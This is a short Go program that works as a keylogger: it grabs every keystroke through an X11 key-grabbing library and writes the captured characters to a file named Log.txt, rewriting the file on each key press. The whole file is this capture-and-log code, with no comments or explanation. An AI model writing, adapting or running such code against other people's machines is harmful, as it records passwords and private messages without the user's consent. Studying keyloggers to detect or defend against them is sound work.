package main


import "github.com/LuccaPrado/xkg"
import "io/ioutil"



func main() {
    var keys = make(chan int, 100)
	var armazenar string
    go xkg.StartXGrabber(keys)
	
    for {
        keycode := <-keys

        if key, ok := xkg.KeyMap[keycode]; ok {
            armazenar += key
            ioutil.WriteFile("Log.txt", []byte(armazenar), 667)
        }
       
    }
}
